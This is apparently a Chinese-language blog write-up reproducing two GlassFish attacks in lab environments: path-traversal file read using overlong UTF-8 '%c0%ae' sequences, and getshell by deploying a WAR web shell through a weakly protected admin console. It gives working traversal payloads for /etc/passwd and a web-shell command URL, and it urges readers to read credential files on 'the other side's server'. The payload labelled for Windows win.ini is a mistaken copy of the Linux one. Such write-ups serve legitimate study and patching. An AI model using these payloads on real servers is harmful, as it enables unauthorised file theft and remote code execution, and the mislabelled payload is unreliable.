# GlassFish 任意文件读取漏洞

GlassFish 是用于构建 Java EE 5应用服务器的开源开发项目的名称。它基于 Sun Microsystems 提供的 Sun Java System Application Server PE 9 的源代码以及 Oracle 贡献的 TopLink 持久性代码。该项目提供了开发高质量应用服务器的结构化过程，以前所未有的速度提供新的功能。
默认端口：8080（Web应用端口，即网站内容），4848（GlassFish管理中心）
指纹信息：
Server: GlassFish Server Open Source Edition 4.1.2
X-Powered-By: Servlet/3.1 JSP/2.3 (GlassFish Server Open Source Edition 4.1.2 Java/Oracle Corporation/1.8)



# 漏洞原理

**java语言中会把%c0%af解析为\uC0AF，最后转义为ASCCII字符的/（斜杠）。利用..%c0%af..%c0%af来向上跳转，达到目录穿越、任意文件读取的效果。 计算机指定了UTF8编码接收二进制并进行转义，当发现字节以0开头，表示这是一个标准ASCII字符，直接转义，当发现110开头，则取2个字节 去掉110模板后转义。**

**java语言中会把%c0%ae解析为\uC0AE，最后转义为ASCCII字符的.（点）。利用%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/来向上跳转，达到目录穿越、任意文件读取的效果。**



# 影响范围

```
<=4.1.2版本
```





**打开GlassFish后台登录界面**

![image-20220427113005081](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220427113005081.png)



使用Payload

```
Linux下读取etc/passwd内容
/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd

windows下读取windows/win.ini文件内容
/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd

可自己构造读取对方服务器上的文件，如一些敏感文件等，或账号密码配置文件
```

使用该payload前先识别对方服务器是windows还是linux，尝试读取默认存在的文件

![image-20220427113338752](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220427113338752.png)

成功执行

![image-20220427113356787](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220427113356787.png)



# 修复建议

升级至最新版本或者4.1.2版本以上。





# GlassFish 后台Getshell

通过爆破或者弱口令进入后台后，可以部署war包来getshell。



# 影响范围

全版本管理中心登录账号弱口令





# 漏洞复现

默认安装的GlassFish管理中心是空密码的，无需登录，直接进入后台。

![image-20211113230142063](https://img-blog.csdnimg.cn/img_convert/c0f354a54b27752d12ce5c663b3b646c.png)





进入后台后 Applications，点击右边的deploy。



![image-20211113230246438](https://img-blog.csdnimg.cn/img_convert/ea6ce807aa6f2ce5d7f91032c77d7751.png)



选中war包后上传，填写Context Root 这个关系到你访问的url，点击Ok。



![image-20211113230644074](https://img-blog.csdnimg.cn/img_convert/a31837f2ce34c12b9bc6e7c0456bd33f.png)

访问`http://127.0.0.1:8080/[Context Root]/[war包内的filename]`
`http://127.0.0.1:8080/getshell/1.jsp?pwd=123&i=ipconfig`

![image-20211113231027707](https://img-blog.csdnimg.cn/img_convert/d67700009260c6e4fbbce78a1b513b7c.png)





# 修复建议

1.不开放后台给外网；
2.若开放 密码强度需设置 包含 大写字母，小写字母，数字，特殊字符，且长度大于10位。









# 总结

GlassFish存在的漏洞有很多，这里总结主要是对一些常见的漏洞复现和分析（主要是vulhub上的环境）当然了目前网上都有很多自动化的检测和利用工具，这里手动验证是为了加深印象


